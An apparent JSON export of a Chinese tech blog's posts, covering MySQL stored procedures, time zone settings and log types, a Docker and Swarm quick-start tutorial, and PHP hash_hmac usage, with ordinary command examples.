存储过程就完成了。 如何在终端执行Mysql 文件？ SQL 脚本准备好了，有两种方式可以执行它。 方式一：不进入Mysql 终端，直接在命令行终端执行 方式二：进入Mysql 终端，在Mysql 终端中执行 这两种方式的共同点就是都需要已知Mysql 密码。 对于方式一，可以使用以下命令来执行： 1mysql -u root -p &lt; .&#x2F;modify_user_table.sql 可以指定数据库： 1mysql -u root -p databaseName &lt; .&#x2F;modify_user_table.sql 对于方式二，可以使用以下命令来执行： 12345&#x2F;&#x2F; 进入Mysql 终端mysql -uroot -p &#x2F;&#x2F; 执行SQL 文件source .&#x2F;modify_user_table.sql 参考链接 Mysql 终端执行SQL 文件 Mysql 存储过程中的变量定义 Mysql 中的变量定义和赋值 Mysql 存储过程中使用动态SQL 语句","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mysql 查看修改默认时区","slug":"mysql-view-and-modify-the-default-time-zone","date":"2020-07-25T15:43:57.000Z","updated":"2020-07-25T15:45:03.233Z","comments":true,"path":"mysql-view-and-modify-the-default-time-zone/","link":"","permalink":"https://www.0x2beace.com/mysql-view-and-modify-the-default-time-zone/","excerpt":"在之前的笔记中，我们知道了时区相关的概念，以及如何在PHP 获取设置默认时区。 这篇笔记就来学习一下如何在Mysql 上获取设置默认时区。","text":"在之前的笔记中，我们知道了时区相关的概念，以及如何在PHP 获取设置默认时区。 这篇笔记就来学习一下如何在Mysql 上获取设置默认时区。 查看默认时区12345678mysql&gt; show variables like &quot;%time_zone%&quot;;+------------------+--------+| Variable_name | Value |+------------------+--------+| system_time_zone | CST || time_zone | SYSTEM |+------------------+--------+2 rows in set (0.01 sec) 设置默认时区设置当前会话12mysql&gt; SET time_zone &#x3D; &quot;+8.00&quot;;mysql&gt; show variables like &quot;%time_zone%&quot;; 此修改只会对当前会话有效。 全局设置1mysql&gt; SET global time_zone &#x3D; &quot;+8.00&quot;; 需要重启该会话，该配置才生效。 编辑 my.ini123# 打开Mysql 的配置文件 my.ini[mysqld]default-time_zone &#x3D; &#39;+8:00&#39; 需要重启Mysql 服务 时间格式GMT（Greenwich Mean Time）：格林威治标准时间UTC：世界标准时间CST（China Standard Time）：中国标准时间 GMT + 8 = UTC + 8 = CST 参考链接 Mysql 查看修改时区 time_zone","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"了解 Mysql 日志","slug":"understanding-the-mysql-log","date":"2020-07-25T15:38:53.000Z","updated":"2020-07-31T12:39:49.199Z","comments":true,"path":"understanding-the-mysql-log/","link":"","permalink":"https://www.0x2beace.com/understanding-the-mysql-log/","excerpt":"日志无论在哪里都是尤为重要的存在，所以这篇笔记的目的就是了解Mysql 日志的。","text":"日志无论在哪里都是尤为重要的存在，所以这篇笔记的目的就是了解Mysql 日志的。 日志简介Mysql 的日志主要分为四类，使用这些日志文件，可以查看Mysql 内部发生的事情，这四类日志分别是： 错误日志：记录Mysql 服务的启动、运行或停止Mysql服务时出现的问题。 查询日志：记录建立的客户端连接和执行的语句。 二进制日志：记录所有更改数据的语句，可以用于数据恢复。 慢查询日志：记录所有执行时间超过 long_query_time 的所有查询或不使用索引的查询。 二进制日志二进制日志主要记录 Mysql 数据库的变化。二进制日志以一种有效的格式，并且是事务安全的方式包含更新日志中可用的所有信息。 启动和设置二进制日志默认情况下，二进制日志是关闭的，可以通过修改mysql 的配置文件来启动和设置二进制日志。 配置文件 my.ini 中有几个设置是关于二进制日志的： 1234567# 如果需要启用，就在 mysqld 组下，加上 log-bin 选项[mysqld]log-binlog-bin [&#x3D;path&#x2F; [filename] ]expire_logs_days &#x3D; 10max_binlog_size &#x3D; 100M log-bin定义开启二进制日志，path 表示日志文件所在的目录路径，filename 指定了日志文件的名称。 expire_logs_days定义了Mysql 清除过期日志的时间，即二进制日至的自动删除的天数。 max_binlog_size定义了单个文件的大小限制，不能将变量设置为大于1GB或者小于4096B。默认值为1GB. 如何检查自己的二进制日志是否开启了呢？ 输入以下命令： 1mysql&gt; show variables like &#39;log_%&#39;; 查看二进制日志查看二进制文件个数及文件名，前提是开启了二进制日志： 1mysql&gt; show binary logs; 删除二进制日志Mysql 也为我们提供了删除二进制日志的方法，有两种，作用不相同。 删除所有二进制日志文件： 1mysql&gt; RESET MASTER; 删除指定二进制日志文件： 12# 其中，binlog.000003 是指二进制文件的名称mysql&gt; PURGE MASTER LOGS TO &quot;binlog.000003&quot;; 使用二进制日志恢复数据库如果启用了Mysql 的二进制日志，在数据库出现意外丢失数据时，可以使用 Mysqlbinlog 工具从指定时间点开始（例如，最后一次备份）直到现在。 Mysqlbinlog 恢复数据库的语法如下： 1mysql&gt; mysqlbinlog [option] filename | mysql -uuser -ppass 实例：使用Mysqlbinlog 恢复Mysql 数据库到2019年1月30日15:27:48时的状态，执行如下命令： 1mysqlbinlog --stop--date&#x3D;&quot;2019-01-30 15:27:48&quot; | path&#x2F;binlogfilename -uuser -ppass 暂停二进制日志功能因为修改Mysql 配置文件可以启用、停用二进制日志功能，但是需要重启Mysql 服务器。Mysql 为我们提供了一种更简单的方式可以暂停记录二进制日志。 暂停记录二进制日志： 1mysql&gt; SET sql_log_bin &#x3D; 0; 恢复记录二进制日志： 1mysql&gt; SET sql_log_bin &#x3D; 1; 错误日志错误日志文件包含了当Mysqld 启动和停止时，以及服务器在运行过程中发生任何严重错误时的相关信息。错误日志默认是开启的。 启动和设置错误日志通过修改my.ini 配置文件，来启用或者停用错误日志 12345# 如果需要启用，就在 mysqld 组下，加上 log-error 选项[mysqld]log-errorlog-error&#x3D;[path&#x2F;filename] 查看错误日志首先使用如下命令查看错误日志的存储路径以及文件名： 1mysql&gt; show variables like &#39;log_error&#39;; 删除错误日志文件Mysql 的错误日志文件是以文本文件的形式存储在文件系统中，可以直接删除。 1mysql&gt; flush logs; 通用查询日志通用查询日志记录了Mysql 的所有操作，包括启动和关闭服务、执行查询和更新语句等。 启用和设置通用查询日志同样的，打开Mysql 的my.ini 配置文件。 1234[mysqld]loglog&#x3D;[path\\filename] 这里有两种方式，log 选项后面如果没有带任何参数表示使用Mysql 默认的存储位置，上面的也一样。 查看通用查询日志可以通过log 设置的日志文件存储路径，去查看具体文件。 慢查询日志慢查询日志记录查询时长超过指定时间的日志。通过慢查询日志，可以找出执行时间较长、执行效率较低的语句，然后进行优化。 启用和设置慢查询日志同样的，打开编辑Mysql 的my.ini 配置文件： 12345[mysqld]log-slow-querieslog-slow-queries&#x3D;[path\\filename]long_query_time&#x3D;n n 表示查询时间的极限值，如果超过了这个值，这个查询过程就会被记录到慢查询日志文件中。 查询慢查询日志同上。 上面这些日志配置的更改都需要重启服务器才能生效，另外还有一种方式可以查看运行时日志。 启用实时日志1234set global general_log &#x3D; on;&#x2F;&#x2F; 查看日志文件目录show variables like &#39;general_log_file&#39;; 这种方式的好处就是不需要重启Mysql 服务。 如果需要禁用： 1set global general_log &#x3D; off; 关于平时应该打开哪些日志的问题。 日志的开启既会影响Mysql 的性能，又会占用大量的磁盘空间。因此如果不必要，应尽可能的少开启日志，根据不同的使用环境，考虑开启不同的日志。 例如：在开发环境中优化查询低效率的语句，可以开启慢查询日志；如果需要记录用的所有查询操作，可以开启通用查询日志；如果需要记录数据的变更，可以开启二进制日志；错误日志默认开启；","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Docker 快速上手","slug":"docker-quick-start","date":"2020-07-23T04:32:57.000Z","updated":"2020-08-22T01:02:14.223Z","comments":true,"path":"docker-quick-start/","link":"","permalink":"https://www.0x2beace.com/docker-quick-start/","excerpt":"这篇笔记的主要目的是用来记录学习 Docker 的过程。Docker这个词并不是第一次听说了，印象中好久以前就听说过这个东西了，只是一直没有真正去了解。","text":"这篇笔记的主要目的是用来记录学习 Docker 的过程。Docker这个词并不是第一次听说了，印象中好久以前就听说过这个东西了，只是一直没有真正去了解。 诞生软件开发最大的麻烦事之一，就是环境配置。 开发者常常说的一句话：它在我的机器上可以跑了。言下之意就是，其他机器可能跑不了。因为可以正常跑的前提是：操作系统的设置，各种软件和组件、库的安装，只有它们都正确了，软件才能正常运行。 配置环境如此麻烦，换一台机器，就得重来一次，旷日费时。因此，聪明的人们就想到，能不能从根本上解决问题。软件可以带环境安装。（这里说的软件是指最终要运行的工程） 虚拟机虚拟机（virtual machine，简称VM）就是带环境安装的一种解决方案。它可以在一个操作系统中运行另外一种操作系统。比如在Windows系统中运行Linux 系统。应用程序对此毫无感觉，因为虚拟机看上去跟真是系统一模一样。而对于底层系统来说，虚拟机就是一个普通文件，不需要就删掉，对其他部分没有影响。 虚拟机（VM）是物理硬件的抽象， 将一台服务器转变为多台服务器。 虽然用户可以通过虚拟机还原软件的原始环境，但是这个方案有几个缺点。在后面会做比较。 容器由于虚拟机存在一些缺点，Linux 发展出了另一种轻量级的操作系统虚拟化解决方案，Linux 容器（Linux Containers，缩写为 LXC）。 Linux 容器不是模拟一个完整的操作系统，而是对进程进行隔离。 容器是应用层的抽象，它将代码和依赖关系打包在一起。 多个容器可以在同一台机器上运行，并与其他容器共享操作系统内核，每个容器在用户空间中作为独立进程运行。容器占用的空间比VM少（容器映像的大小通常为几十MB），可以处理更多的应用程序，并且需要更少的VM和操作系统。 由于容器是进程级别的，相比虚拟机有很多的优势。后面会做比较。 Docker 是什么Docker 属于Linux 容器的一种封装，提供简单易用的容器使用接口。 它是目前最流行的 Linux 容器解决方案。 Docker 与虚拟机的区别 名称 占用资源 启动速度 级别 Docker 占用资源少 启动快 轻量级 虚拟机 占用资源多 启动慢 重量级 Docker CE 与 Docker EEDocker CE(Docker Community Edition) 是社区版，简单理解是免费使用，提供小企业与小的IT团队使用,希望从Docker开始，并尝试基于容器的应用程序部署。 Docker EE(Docker Enterprise Edition) 是企业版，收费。提供功能更强。适合大企业与打的IT团队。为企业开发和IT团队设计，他们在生产中构建、交付和运行业务关键应用程序 Docker CE 有三种类型的更新通道：stable、test和 nightly Stable 提供一般可用性的最新版本 Test 提供在一般可用之前准备好进行测试的预发布。 Nightly 提供下一个主要版本的最新正在进行的工作。 安装 Docker-CE这里以Ubuntu 18.04 为例： 1234561. sudo apt install apt-transport-https ca-certificates software-properties-common curl-transport-https ca-certificates software-properties-common curl2. curl -fsSL https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add --fsSL https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add -3. sudo add-apt-repository &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu \\-apt-repository &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu \\$(lsb_release -cs) stable&quot;4. sudo apt update5. sudo apt install docker-ce 将当前用户添加到docker 用户组，可以不用sudo 运行docker 12$ sudo groupadd docker$ sudo usermod -aG docker $USER-aG docker $USER Docker 镜像Docker 镜像就是一个只读的模板。 例如：一个镜像可以包含一个完整的 ubuntu 操作系统环境，里面仅安装了 Apache 或用户需要的其它应用程序。 镜像可以用来创建 Docker 容器。 Docker 容器Docker 利用容器来运行应用。 容器是从镜像创建的运行实例。它可以被启动、开始、停止、删除。每个容器都是相互隔离的、保证安全的平台。 可以把容器看做是一个简易版的 Linux 环境（包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。 注：镜像是只读的，容器在启动的时候创建一层可写层作为最上层。 Docker 仓库仓库是集中存放镜像文件的场所。有时候会把仓库和仓库注册服务器（Registry）混为一谈，并不严格区分。实际上，仓库注册服务器上往往存放着多个仓库，每个仓库中又包含了多个镜像（image），每个镜像有不同的标签（tag）。 仓库分为公开仓库（Public）和私有仓库（Private）两种形式。 最大的公开仓库是 Docker Hub，存放了数量庞大的镜像供用户下载。 国内的公开仓库包括 Docker Pool 等，可以提供大陆用户更稳定快速的访问。 当然，用户也可以在本地网络内创建一个私有仓库。 当用户创建了自己的镜像之后就可以使用 push 命令将它上传到公有或者私有仓库，这样下次在另外一台机器上使用这个镜像时候，只需要从仓库上 pull 下来就可以了。 注：Docker 仓库的概念跟 Git 类似，注册服务器可以理解为 GitHub 这样的托管服务。 镜像和容器的区别容器和镜像的关系如下： Dockerfile用于定义镜像，依赖镜像来运行容器，仓库则是存放镜像的地方。 Dockerfile 是什么？Dockerfile 是一个创建Docker 镜像所需的文件，其中会包含一组指令来告诉Docker 如何构建我们的镜像。 示例： 123456789101112131415161718192021$ cat Dockerfile# 使用官方Python运行时作为父映像FROM python:2.7-slim# 将工作目录设置为&#x2F;appWORKDIR &#x2F;app# 将当前目录内容复制到容器at &#x2F;appCOPY . &#x2F;app# 安装requirements.txt中指定的任何需要的包RUN pip install --trusted-host pypi.python.org -r requirements.txt# #让80 端口号对外开放EXPOSE 80# 定义环境变量ENV NAME World# 在容器启动时运行app.pyCMD [&quot;python&quot;, &quot;app.py&quot;] 如何用镜像创建一个容器？首先，我们需要一个镜像，然后才能创建容器。想要在Docker 上创建一个镜像，非常简单。 cd 到项目文件夹中 使用 docker build --tag=mydockerapp . 命令，创建一个Docker 镜像。–tag 选项命名。 使用 docker run -d -p 4000:80 mydockerapp命令，创建一个新容器。 该命令表示：Docker 以mydockerapp镜像创建一个新容器，同时以分离模式在后台运行该应用程序，将该容器的80端口映射到主机的4000端口。 其中：-d：让容器在后台运行-p：将容器内部端口映射到指定的主机端口上。-P :是容器内部端口随机映射到主机的端口上。 Docker 网络端口映射使用命令： 1$ docker run -p 4000:80 mydocker 然后用docker container ls查看容器列表 下图的意思表示：将该容器的端口80映射到4000，从而生成正确的URL http://localhost:4000。 Docker 开放了 80 端口映射到主机端口 4000 上。 Docker 容器连接前面我们实现了通过网络端口来访问运行在 docker 容器内的服务。下面我们来实现通过端口连接到一个 docker 容器 如何运行负载均衡应用？在开始之前，你得首先满足以下条件： 安装Docker 1.13或更高版本。 了解如何创建容器。 确保已经创建镜像并发布到注册表。我们在这里需要使用该共享镜像。 确保镜像作为已部署的容器运行，并能访问。 确保有docker-compose.yml配置文件，然后依次执行以下命令 1234567$ docker swarm init$ docker stack deploy -c docker-compose.yml getstartedlab# 顺利的话，就能直接部署成功了。使用docker container ls 可以看到正在运行的实例。# 使用 curl http:&#x2F;&#x2F;localhost:4000 或者是刷新浏览器。# 无论以哪种方式，容器ID 都会发生变化。从而证明负载均衡成功。# 对于每个请求，以循环方式选择5个任务中的一个来响应。# 容器ID与上一个命令（docker container ls -q）的输出匹配。 关于服务在分布式应用程序中，应用程序的不同部分称为“服务”。例如，如果您想象一个视频共享站点，它可能包括一个用于在数据库中存储应用程序数据的服务，一个用户在上传内容后在后台进行视频转码的服务，一个用于前端的服务，等等。 服务实际上只是“生产中的容器”。服务只运行一个镜像，但它编码了镜像运行的方式 - 它应该使用哪些端口，应该运行多少个容器副本，以便服务具有所需的容量，以及等等。扩展服务会更改运行该软件的容器实例的数量，从而为流程中的服务分配更多计算资源。 在服务中运行的单个容器称为任务。任务被赋予以数字递增的唯一ID，最多为replicas您定义 的数量docker-compose.yml。 幸运的是，使用Docker平台定义，运行和扩展服务非常容易 - 只需编写一个docker-compose.yml文件即可。 如何在Docker上安装 Docker Machine？Ubuntu 18.04 请看文末的参考链接。 MacOS 如果是从DockerHub官网下载的dmg 安装的Docker，不用担心，Docker-Machine 已经安装好了。 如何安装VirtualBox？Ubuntu 18.04 请看文末的参考链接。 MacOS 则需要从virtualbox官网下载dmg安装包。 你可能会遇到一个错误，参考解决：如何在MacOS上安装VirtualBox 了解Swarm集群群由多个节点组成，可以是物理或虚拟机。基本概念很简单：运行docker swarm init以启用swarm模式并使当前计算机成为一个swarm管理器。 这个章节是这个文档系列中学的时间最长的，坑有点多，走了不少弯路，这一节也挺重要的 重点记下笔记。 在MacOS 下，部分命令需要 sudo 权限。 创建一个集群（本地计算机的VM）在开始这部分之前，需要提前安装好Oracle VirtualBox. 1$ docker-machine create --driver virutalbox myvm1 如果你收到了这样的信息： 12$ Error with pre-create check: &quot;VBoxManage not found. Make sure VirtualBox is installed and VBoxManage is in the path&quot; 说明你的Vritualbox还是没有安装好。 查看正在运行的VM 1234$ docker-machine lsNAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORSmyvm1 - virtualbox Running tcp:&#x2F;&#x2F;192.168.99.104:2376 v17.06.2-cemyvm2 - virtualbox Running tcp:&#x2F;&#x2F;192.168.99.105:2376 v17.06.2-ce 这样就成功的创建了一台VM，接下来我们要将这台机器作为管理器，第二台作为工作者。 另外值得一提的是，尽管我在Ubuntu 18.04 上分别安装好了docker-machine、virtualbox，但当我创建 VM 时，总是会提示我计算机没有开启什么虚拟化（BOIS）。 后来我大概想明白了，可能是我的那台服务器的配置太低了，真的是某个设置项没有启动导致的。 今天在MacBook 上重新操作了一边，异常顺利。 记录一个问题：使用docker-machine create --driver virtualbox myvm1创建VM时，创建成功了，但是并不是我想要的实例。得到了以下信息： 1234(default) Creating a new host-only adapter produced an error: hostonlyif create failed:(default) 0%...(default) Progress state: E_FAIL(default) VBoxManage.exe: error: Failed to create the host-only adapter 找了好久也没有找到答案，最后是怎么解决的呢？重启机器（加上 sudo）。 启动\\停止 VM 12$ docker-machine start Name$ docker-machine stop Name 初始化Swarm 并添加节点这里是一个小坑，之前在这里栽了好久。 这里有两种方式初始化节点或者说操作 VM（推荐第一种）： ssh 连接VM 实例，在Docker VM Cli 中执行命令 1234567$ docker-machine ssh myvm1docker@myvm1: $ docker swarm init --advertise-addr &lt;myvm1 ip&gt;&quot;# &lt;myvm1 ip&gt; 指docker-machine ls 对应的 ip# 正常会得到这样一个输出To add a worker to this swarm, run the following command: docker swarm join --token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo 192.168.99.103:2377 将myvm2 实例作为工作者加入（方式一）1234567$ docker-machine ssh myvm1docker@myvm1: $ docker swarm join --token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo 192.168.99.103:2377# 成功，会得到这样的输出This node joined a swarm as a worker. 直接通过 docker-machine ssh myvm1 执行相应命令 12$ docker-machine ssh myvm1 &quot;docker swarm init --advertise-addr &lt;myvm1 ip&gt;&quot;# 同上 将myvm2 实例作为工作者加入（方式二）执行上面得到的输出： 123456$ docker-machine ssh myvm2 &quot; docker swarm join --token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo 192.168.99.103:2377&quot;# 成功，会得到这样的输出This node joined a swarm as a worker. 这样，我们就成功的创建了一个集群，并将一个工作者作为一个节点加入了。 在管理器上查看集群中的节点：1234docker@myvm1: $ docker node lsID HOSTNAME STATUS AVAILABILITY MANAGER STATUSrihwohkh3ph38fhillhhb84sk * myvm1 Ready Active Leaderbrtu9urxwfd5j0zrmkubhpkbd myvm2 Ready Active 为什么上面要介绍那两种与 VM 实例进行交互的方式呢？ 因为会和后面的在集群部署应用程序有一定联系。 在集群中部署应用程序在开始部署之前，我们需要了解到有两种方式可以实现。 docker-machine 为Swarm 管理器配置Shell 到目前为止，我们与 VM 通信都是通过 docker-machine ssh这种方式，另一种更好的方式就是：将当前shell配置为与VM上的Docker守护程序通信。 这样我们就可以直接本地的docker-compose.yml文件远程部署应用程序，而无需将其复制到其他任何位置。 12345678910$ docker-machine env myvm1export DOCKER_TLS_VERIFY&#x3D;&quot;1&quot;export DOCKER_HOST&#x3D;&quot;tcp:&#x2F;&#x2F;192.168.99.100:2376&quot;export DOCKER_CERT_PATH&#x3D;&quot;&#x2F;Users&#x2F;sam&#x2F;.docker&#x2F;machine&#x2F;machines&#x2F;myvm1&quot;export DOCKER_MACHINE_NAME&#x3D;&quot;myvm1&quot;# Run this command to configure your shell:# eval $(docker-machine env myvm1)# 运行最后一行命令以配置与之通信的 shell $ eval $(docker-machine env myvm1) # eval $(sudodocker-machine env myvm1) 运行docker-machine ls 已验证 myvm1 现在是活动的计算机。带有星号（*）表示配置成功 1234$ docker-machine lsNAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORSmyvm1 * virtualbox Running tcp:&#x2F;&#x2F;192.168.99.100:2376 v17.06.2-cemyvm2 - virtualbox Running tcp:&#x2F;&#x2F;192.168.99.101:2376 v17.06.2-ce 部署应用程序 123$ lsdocker-compose.yml$ docker stack deploy -c docker-compose.yml getstartedlab 传统方式 传统的方式就是将docker-compose.yml文件拷贝到对应的管理器中。 1234# 使用scp 命令将文件拷贝到 vm 实例中$ lsdocker-compose.yml$ docker-machine scp docker-compose.yml myvm1:~ 部署应用程序 12345678# 这里就可以随意选择使用之前介绍的方式一或者方式二# 方式一$ docker-machine ssh myvm1 &quot;docker stack deploy -c docker-compose.yml getstartedlab&quot;# 方式二$ docker-machine ssh myvm1docker@myvm1: $ docker stack deploy -c docker-compose.yml 耐心等待一会，就可以看到看到部署成功了。 访问集群在访问集群之前，你需要知道以下两件事： 访问集群的IP 地址是VM 的IP，使用docker-machine ls查看 是否存在端口号，取决于你的docker-compose.yml文件 Docker 常用命令容器的生命周期创建一个新的容器并运行： 123456789$ docker run [OPTIONS] IMAGE [COMMAND] [ARG...]$ docker run ubuntu:15.10 &#x2F;bin&#x2F;echo &quot;Hello world&quot;# 解释：Docker以ubuntu15.10镜像创建一个新容器，然后在容器里执行 bin&#x2F;echo &quot;Hello world&quot;，最后输出结果。参数* -d：让容器在后台运行* -p：内部容器绑定到指定的主机端口上* -P：内部容器端口随机映射到主机端口上* --name：给容器命名，如果不加--name 参数，Docker 会自动命名。 杀掉一个运行中的容器： 12$ docker kill -s KILL mydocker# mydocker 表示Contianer ID或者Name 结束停止一个运行中的容器： 12$ docker container stop mydocker# mydocker 表示Container ID或者Name 查看正在运行的容器： 123456$ docker ps参数* -l：查询最后一次创建容器记录* --all：查询所有创建容器记录* -aq：查询所有创建容器的Container ID 停止Web 应用容器 这个只是停止该容器的运行，并没有杀死 1$ docker stop mydocker 启动Web 应用容器 已经停止的容器，可以使用命令 docker start 来启动。 1$ docker start mydocker 移除Web 应用容器 123$ docker rm mydockermydocker# 删除容器时，容器必须是停止状态，否者会报错。 镜像操作如何创建一个Docker 镜像 1$ docker build --tag&#x3D;mydockerapp # 注意：标签名只能小写 列出下载到计算机中的镜像 12345678910$ docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEhello-world latest fce289e99eb9 3 months ago 1.84kB各个选项说明:* REPOSITORY：表示镜像的仓库源* TAG：镜像的标签* IMAGE ID：镜像ID* CREATED：镜像创建时间* SIZE：镜像大小 查找镜像 123456789$ docker search nginx NAME DESCRIPTION STARS OFFICIAL nginx Official build of Nginx. 11154 [OK]NAME:镜像仓库源的名称DESCRIPTION:镜像的描述OFFICIAL:是否docker官方发布 获取一个新镜像 如果我们决定使用上图中的 nginx 官方镜像，使用如下命令： 1$ docker pull nginx 容器操作列出下载到计算机中的 container 12$ docker container lsCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 仓库操作登入hub.docker.com 12$ docker login # 前提是先注册号账号 标记镜像，以便上传至目标位置 12$ docker tag mydocker aikang&#x2F;get-started:part1# 最后上传至所登入的Docker Hub仓库 将标记的镜像上传到存储库： 1$ docker push mydocker aikang&#x2F;get-started:part1 从远程存储库中拉出并运行映像 1$ docker run -d -p 4000:80 aikang&#x2F;get-started:part1 注意：无论在哪里执行docker run，它都会提取你的镜像，以及Python和所有依赖项requirements.txt，并运行你的代码。它们都在一个整洁的小包中一起旅行，你不需要在主机上安装任何东西让Docker运行它。 服务操作群集初始化，可以使节点变成群集管理器 1$ docker swarm init 以服务运行 1234$ docker stack deploy -c docker-compose.yml getstartedlabCreating network getstartedlab_webnetCreating service getstartedlab_web# 需要有一个docker-compose.yml 文件 列出与应用程序关联的正在运行的服务 1$ docker service ls 查看与堆栈相关的所有服务 12$ docker stack services getstartedlab# getstartedlab 表示服务的Names 列出服务任务 12$ docker service ps getstartedlab# getstartedlab 表示服务的Names 关闭服务 12$ docker stack rm getstartedlab# getstartedlab 表示服务的Names 查看集群中的节点 1$ docker node ls VM 交互创建一个VM 实例（Win、Mac、Linux） 1$ docker-machine create --driver virtualbox myvm1 使用ssh 连接VM 实例 1$ docker-machine ssh myvm1 查看关于节点的基本信息 1$ docker-machine env myvm1 使用scp命令将本地文件copy到VM实例中 12$ docker-machine scp &lt;filename&gt; myvm1:~ # 从当前目录拷贝到实例中的根目录下 删除指定VM 1$ docker-machine rm myvm1 将Shell 与VM 连接 1$ eval $(docker-machine env myvm1) 将Shell 与VM 断开，使用本地连接 1$ eval $(docker-machine env -u) 集群操作以下操作均需要在VM CLI 中运行 初始化集群 1$ docker swarm init --advertise-addr &lt;myvm1 ip&gt; 将节点加入集群 1$ docker swarm join --token &lt;token&gt; &lt;ip&gt;:2377&quot; 让工作者离开集群 1$ docker swarm leave 强制离开并关掉集群 1$ docker swarm leave -f 查看该节点的详情信息 1$ docker node inspect &lt;node ID&gt; 部署应用程序 1$ docker stack deploy -c &lt;file&gt; &lt;app&gt; 杂项查看Docker版本： 1$ docker version 显示Docker系统信息，包括镜像和容器数： 1$ docker info 查看Docker 容器的配置和状态信息。 12$ docker inspect mydocker# 表示容器的Container ID 或者Names 查看指定容器映射到宿主机的端口号。 123$ docker port mydocker80&#x2F;tcp -&gt; 0.0.0.0:4000# mydocker 表示该应用的Container ID 或者Names 查看Web 应用程序日志 12345$ docker logs -f mydocker * Running on http:&#x2F;&#x2F;0.0.0.0:80&#x2F; (Press CTRL+C to quit)113.87.130.57 - - [01&#x2F;Apr&#x2F;2019 12:58:34] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -113.87.130.57 - - [01&#x2F;Apr&#x2F;2019 12:58:35] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -# mydocker 表示该应用的Container ID 或者是Names 查看Web 应用程序容器的进程 1234$ docker top mydocker # UID PID PPID C STIME TTY TIME CMDroot 22358 22323 0 20:58 ? 00:00:00 python app.py 杂项容器有哪些网络模式1. None在该模式下容器没有对外网络，本地机只有一个回路地址 2. Container在该模式下，与另一个容器共享网络 3. Host在该模式下，与主机共享网络 4. Bridge该模式为Docker 默认的网络模式，在这种模式下，Docker 容器与外部的通信都是通过 iptable 实现的。 5. Overlay该模式为Docker 目前原生的跨主机多子网模型，主要是通过 vxlan 技术实现。 参考链接 Docker 入门教程 - 阮一峰网络日志 Docker 入门 - 极客学院 安装Docker ce - 官方文档 Docker Swarm 入门教程 如何在Ubuntu 18.4上安装 Docker-ce 如何在Ubuntu 18.04上安装Docker Machine 如何在Ubuntu 18.04上安装VirtualBox","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Tutorial","slug":"Linux/Tutorial","permalink":"https://www.0x2beace.com/categories/Linux/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"}]},{"title":"PHP 中使用 hash_hmac 加密","slug":"php-uses-hash-hmac-encryption","date":"2020-07-22T16:18:45.000Z","updated":"2020-11-12T01:26:42.165Z","comments":true,"path":"php-uses-hash-hmac-encryption/","link":"","permalink":"https://www.0x2beace.com/php-uses-hash-hmac-encryption/","excerpt":"今天做项目时，遇到一个问题，需要将一段哈希值按照某种规则进行加密。源码是用Node写的，需要翻译成PHP 版本的。","text":"今天做项目时，遇到一个问题，需要将一段哈希值按照某种规则进行加密。源码是用Node写的，需要翻译成PHP 版本的。 PHP中使用 Hmac 方法生成带有密钥的哈希值在Node.js 中，这是一段用于生成“加盐”的哈希值。 12345678var crypto &#x3D; require(&#39;crypto&#39;);var secret &#x3D; &quot;122410&quot;var key &#x3D; &quot;key&quot;var hash &#x3D; crypto.createHmac(&#39;sha256&#39;, secret).update(key).digest(&#39;hex&#39;)console.log(hash);&#x2F;&#x2F; dcc9ddf4836d4ecb6bd12fccc983207f39cfb84c43c01932eee22357cf0567b4 如果要翻译成PHP版本，其实非常简单，直接使用PHP 的 hash_hmac函数就可以了。 12345&lt;?php$secret &#x3D; &quot;122410&quot;; $key &#x3D; &quot;key&quot;;echo hash_hmac(&quot;sha256&quot;, $key, $secret);&#x2F;&#x2F; dcc9ddf4836d4ecb6bd12fccc983207f39cfb84c43c01932eee22357cf0567b4 将密钥设置成二进制如果需要加密的部分，并不是普通的字符串，而是二进制字符串，那么需要使用pack函数。 1234var_dump(hash_hmac(&quot;sha1&quot;, &quot;office:fred&quot;, &quot;AA381AC5E4298C23B3B3333333333333333333&quot;));&#x2F;&#x2F; 5e50e6458b0cdc7ee534967d113a9deffe6740d0&#x2F;&#x2F; 预期结果：46abe81345b1da2f1a330bba3d6254e110cd9ad8 先将十六进制字符串转换为二进制数据，然后再将其传递给hash_hmac： 123var_dump(hash_hmac(&quot;sha1&quot;, &quot;office:fred&quot;, pack(&quot;H*&quot;, &quot;AA381AC5E4298C23B3B3333333333333333333&quot;)));&#x2F;&#x2F; 